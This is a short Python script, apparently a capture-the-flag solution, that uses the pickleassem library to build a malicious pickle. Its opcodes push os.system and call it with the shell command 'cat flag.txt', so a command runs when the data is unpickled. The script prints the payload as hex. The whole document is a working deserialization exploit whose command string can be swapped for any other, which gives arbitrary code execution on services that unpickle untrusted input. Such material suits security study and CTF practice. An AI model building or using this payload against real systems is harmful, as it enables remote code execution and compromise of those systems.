from pickleassem import PickleAssembler

pa = PickleAssembler(proto=4)
pa.push_mark()

# create and push "class" object
pa.util_push("os") # module name
pa.util_push("system") # class name (disguised)
pa.build_stack_global() # push class object

# push "class" object's args
pa.util_push("cat flag.txt")

# pop until mark and build "class" object
# invokes _instantiate, executing our malicious logic
pa.build_obj()

payload = pa.assemble()
print(payload.hex())
